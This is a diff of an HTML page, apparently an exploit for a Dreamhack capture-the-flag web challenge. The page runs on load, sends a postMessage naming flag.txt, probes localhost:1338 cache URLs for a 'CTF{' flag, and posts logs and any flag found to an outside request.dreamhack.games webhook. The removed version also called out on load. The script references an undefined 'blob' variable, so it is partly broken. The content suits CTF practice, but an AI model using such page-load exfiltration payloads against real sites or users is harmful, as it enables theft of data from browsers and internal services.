@@ -1,10 +1,115 @@
 <!DOCTYPE html>
-<html><body>
-<h1>Test Page</h1>
-<script>
-fetch('https://yhnbdot.request.dreamhack.games', {
-    method: 'POST', 
-    body: 'Bot reached the page!'
-});
-</script>
-</body></html>
+<html>
+<head>
+    <title>Debug Attack</title>
+</head>
+<body>
+    <h1>🔍 Debug Attack Page</h1>
+    <div id="status">Loading...</div>
+    <div id="log"></div>
+
+    <script>
+        function log(msg) {
+            const div = document.createElement('div');
+            div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            document.getElementById('log').appendChild(div);
+            console.log(msg);
+            
+            // 웹훅으로도 로그 전송
+            try {
+                fetch('https://qniqmpt.request.dreamhack.games', {
+                    method: 'POST',
+                    body: `LOG: ${msg}`
+                }).catch(() => {});
+            } catch (e) {}
+        }
+
+        function updateStatus(msg) {
+            document.getElementById('status').innerHTML = msg;
+            log(msg);
+        }
+
+        async function simpleAttack() {
+            try {
+                updateStatus("🚀 Attack started");
+
+                // 1. 우선 간단한 postMessage만 시도
+                updateStatus("📤 Adding cached files...");
+                
+
+                        
+                window.postMessage({
+                    type: "share",
+                    files: [{
+                        blob: blob,
+                        cached: true,
+                        name: "flag.txt",
+                    }],
+                }, "*");
+                        
+
+
+                updateStatus("⏳ Waiting 3 seconds...");
+                await new Promise(resolve => setTimeout(resolve, 3000));
+
+
+                // 3. Cache 파일들 시도 (간단하게)
+                updateStatus("📁 Trying cache files...");
+                
+                for (let i = 1; i <= 5; i++) {
+                    try {
+                        log(`Trying cache=${i}`);
+                        
+                        const response = await fetch(`http://localhost:1338/?cache=${i}`, {
+                            mode: 'no-cors'
+                        });
+                        
+                        log(`Cache ${i}: response received`);
+                        
+                        if (response.type !== 'opaque') {
+                            const content = await response.text();
+                            log(`Cache ${i} content: ${content}`);
+                            
+                            if (content.includes('CTF{')) {
+                                log(`🚩 POTENTIAL FLAG: ${content}`);
+                                updateStatus(`🚩 FLAG FOUND: ${content}`);
+                                
+                                // 웹훅으로 전송
+                                await fetch('https://qniqmpt.request.dreamhack.games', {
+                                    method: 'POST',
+                                    body: `FLAG FOUND: ${content}`
+                                });
+                            }
+                        }
+                    } catch (e) {
+                        log(`Cache ${i} error: ${e.message}`);
+                    }
+                }
+
+                updateStatus("✅ Attack completed");
+
+            } catch (error) {
+                log(`💥 Main error: ${error.message}`);
+                updateStatus(`❌ Error: ${error.message}`);
+            }
+        }
+
+        // 즉시 시작 (타이머 없이)
+        window.onload = function() {
+            log("🎯 Page loaded - starting attack immediately");
+            simpleAttack();
+        };
+
+        // 추가 디버깅: 모든 에러 캐치
+        window.onerror = function(msg, url, line, col, error) {
+            log(`💥 Global error: ${msg} at ${line}:${col}`);
+            return false;
+        };
+
+        // Promise rejection 캐치
+        window.addEventListener('unhandledrejection', function(event) {
+            log(`💥 Unhandled promise rejection: ${event.reason}`);
+        });
+    </script>
+</body>
+</html>
